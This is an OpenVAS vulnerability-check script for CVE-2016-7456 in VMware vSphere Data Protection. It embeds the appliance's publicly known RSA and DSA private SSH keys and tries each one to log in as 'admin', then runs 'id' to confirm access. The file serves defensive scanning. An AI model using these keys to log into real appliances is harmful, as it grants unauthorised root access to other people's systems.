###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vmware_vsphere_data_protection_admin1_known_ssh_key.nasl 13568 2019-02-11 10:22:27Z cfischer $
#
# VMSA-2016-0024: vSphere Data Protection (VDP) updates address SSH Key-Based authentication issue (dpnid)
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140104");
  script_cve_id("CVE-2016-7456");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13568 $");
  script_name("VMSA-2016-0024: vSphere Data Protection (VDP) updates address SSH Key-Based authentication issue (dpnid)");

  script_xref(name:"URL", value:"http://www.vmware.com/security/advisories/VMSA-2016-0024.html");

  script_tag(name:"vuldetect", value:"Try to login with a known private ssh key");

  script_tag(name:"solution", value:"Apply the Patch");

  script_tag(name:"summary", value:"vSphere Data Protection (VDP) updates address SSH key-based authentication issue.");

  script_tag(name:"insight", value:"VDP contains a private SSH key with a known password that is configured to allow key-based
  authentication. Exploitation of this issue may allow an unauthorized remote attacker to log into the appliance with root privileges.");

  script_tag(name:"affected", value:"VDP 6.1.x, 6.0.x, 5.8.x, 5.5.x");

  script_tag(name:"last_modification", value:"$Date: 2019-02-11 11:22:27 +0100 (Mon, 11 Feb 2019) $");
  script_tag(name:"creation_date", value:"2016-12-28 11:04:22 +0100 (Wed, 28 Dec 2016)");
  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"VendorFix");
  script_category(ACT_ATTACK);
  script_family("General");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("ssh_detect.nasl");
  script_require_ports("Services/ssh", 22);
  script_mandatory_keys("ssh/server_banner/available");

  exit(0);
}

include("ssh_func.inc");

port = get_ssh_port(default:22);

keys = make_list(
'-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----',
'-----BEGIN DSA PRIVATE KEY-----
MIIBuwIBAAKBgQCWUMSv1kpW6ekyej2CaRNn4uX0YJ1xbzp7s0xXgevU+x5GueQS
mS+Y+DCvN7ea2MOupF9n77I2qVaLuCTZo1bUDWgHFAzc8BIRuxSa0/U9cVUxGA+u
+BkpuepaWGW4Vz5eHIbtCuffZXlRNcTDNrqDrJfKSgZW2EjBNB7vCgb1UwIVANlk
FYwGnfrXgyXiehj0V8p9Mut3AoGANktxdMoUnER7lVH1heIMq6lACWOfdbltEdwa
/Q7OeuZEY434C00AUsP2q6f9bYRCdOQUeSC5hEeqb7vgOe/3HN02GRH7sPZjfWHR
/snADZsWvz0TZQuybs8dEdGh/ezGhiItCINFkVg7NvSXx85dMVsB5N9Ju0gDsZxW
/d41VXYCgYBH0zIlb3lvioedyZj2mKF6fycnCZIeeDnL8wZtZPStRht6i4PFTCX1
Y/Ogw0L0bhuthOx+VTgICB87r0TmXElNUDLSncsxuw7pmHa669idUkv43CjeDkH0
kGFEHt4QA6/xw1Xq9oNpRJTo62ZsFmv0Pwp3uE7up8s0LW1O6fr+OwIVAKCJZ8nm
UwIdhEc9aU7sBDTFijP+
-----END DSA PRIVATE KEY-----');

user = 'admin';

foreach key ( keys )
{
  if( ! soc = open_sock_tcp( port ) ) continue;

  login = ssh_login( socket:soc, login:user, password:NULL, priv:key, passphrase:NULL );

  if( login == 0 )
  {
    cmd = ssh_cmd( socket:soc, cmd:'id' );
    close( soc );
    if( cmd =~ "uid=[0-9]+.*gid=[0-9]+" )
    {
      security_message( port:port, data: 'It was possible to login as user `admin` using a known SSH private key without any passphrase and to execute the `id` command. Result:\n\n' + cmd + '\n');
      exit( 0 );
    }
    exit( 0 );
  }

  if( soc ) close( soc );
}

exit( 99 );